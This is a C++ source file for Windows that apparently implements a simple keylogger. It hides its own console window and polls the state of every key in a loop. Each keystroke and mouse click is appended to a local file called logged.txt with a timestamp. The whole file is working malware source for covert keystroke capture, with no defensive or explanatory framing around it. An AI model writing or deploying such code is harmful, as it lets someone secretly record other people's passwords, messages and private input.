#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <time.h>
#include <algorithm>
#include <time.h>
using namespace std;

#define LOG_FILE "logged.txt"
ofstream outputLog;

string outputSpecialKey(char key) {
    string result;

    switch (key)
    {
    case VK_SPACE:
        result = " ";
        break;
    case VK_RETURN:
        result = "\n";
        break;
    case VK_SHIFT:
        result = "[SHIFT]";
        break;
    case VK_BACK:
        result = "[BACKSPACE]";
        break;
    case VK_TAB:
        result = "\t";
        break;
    case VK_CONTROL:
        result = "[CTRL]";
        break;
    case VK_MENU:
        result = "[ALT]";
        break;
    case VK_CAPITAL:
        result = "[CAPS_LOCK]";
        break;
    case VK_DELETE:
        result = "[DELETE]";
        break;
    case VK_ESCAPE:
        result = "[ESCAPE]";
        break;
    case VK_LBUTTON:
        result = "[LEFT_CLICK]";
        break;
    case VK_RBUTTON:
        result = "[RIGHT_CLICK]";
        break;
    default:
        break;
    }

    return result;
}

int main()
{
    // array of special keys declared by Win32 header
    int specialKeys[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB,
        VK_CONTROL, VK_MENU, VK_CAPITAL, VK_DELETE, VK_ESCAPE, VK_LBUTTON,
        VK_RBUTTON};
    // ios::app declares append mode
    outputLog.open(LOG_FILE, ios::app);

    // hide the terminal
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (true) {
        time_t current = time(0);

        for (int key = 0; key < 256; key++) {
            // check if key was pressed after previous call to GetAsyncKeyState
            if (GetAsyncKeyState((char)key) & 0x0001) {
                string output;

                // check if special key was detected
                if (count(begin(specialKeys), end(specialKeys), key) > 0) {
                    // EARLY EXIT by pressing escape
                    if (key == VK_ESCAPE) {
                        return 0;
                    }
                    output = outputSpecialKey((char)key);
                // else, normal key was pressed
                } else {
                    bool isUpper = false;
                    // check if shift key is currently pressed
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        isUpper = !isUpper;
                    }
                    // check if caps lock key is currently toggled
                    if (GetKeyState(VK_CAPITAL) & 0x0001) {
                        isUpper = !isUpper;
                    }
                    
                    // toggle the case of the output
                    if (isUpper) {
                        output = (char)key;
                    } else {
                        output = tolower((char)key);
                    }
                }
                // get current time
                char * date = ctime(&current);
                date[strlen(date) - 1] = '\0';
                // output to text file
                outputLog << date;
                outputLog << ": " << output;;
                // new line
                outputLog.put('\n');
            }
        }
    }

    return 0;
}